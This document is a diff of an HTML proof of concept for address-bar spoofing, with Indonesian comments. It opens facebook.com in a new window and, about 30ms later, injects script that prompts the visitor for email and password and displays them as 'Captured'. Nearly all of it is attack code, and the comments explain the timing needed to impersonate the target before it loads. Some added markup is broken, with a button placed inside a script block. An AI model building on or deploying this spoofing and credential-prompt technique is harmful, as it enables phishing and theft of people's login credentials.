@@ -2,38 +2,31 @@
 <html>
   <body>
     <script>
-      // Auto-run saat halaman dibuka
+      <button onclick="spoof()">Click to spoof</button>
       function spoof() {
-        // Buka jendela baru dengan domain target untuk spoof address bar
+        // 1. Buka tab baru ke domain target (untuk spoof address bar)
         let win = window.open("https://www.facebook.com:80", "_blank");
 
-        // Injeksi konten palsu dengan delay kecil sebelum target termuat
+        // 2. Setelah delay kecil (20–50ms), tampilkan prompt langsung
         setTimeout(() => {
           try {
-            win.document.open();
             win.document.write(`
-              <h1>This is not Google!</h1>
-              <p>Please sign in to continue</p>
-              <input placeholder="Email" /><br>
-              <input placeholder="Password" type="password" /><br>
-              <button onclick="
-                let u = document.querySelector('input[placeholder=Email]').value;
-                let p = document.querySelector('input[placeholder=Password]').value;
-                alert('Captured:\\nUsername: ' + u + '\\nPassword: ' + p);
-              ">Sign In</button>
+              <script>
+                setTimeout(() => {
+                  let email = prompt('To continue, please enter your email:');
+                  let pass = prompt('Now enter your password:');
+                  alert('Captured:\\nEmail: ' + email + '\\nPassword: ' + pass);
+                }, 500);
+              <\/script>
               <style>
-                body {
-                  font-family: sans-serif;
-                  padding: 20px;
-                  background: white;
-                }
+                body { background: white; }
               </style>
             `);
             win.document.close();
-          } catch (err) {
-            console.warn("Likely blocked by browser:", err);
+          } catch (e) {
+            console.warn("Blocked by browser:", e);
           }
-        }, 30); // timing penting (20–50ms ideal)
+        }, 30); // Timing kritis: injeksi sebelum navigasi target aktif
       }
 
       // Jalankan otomatis saat halaman dimuat
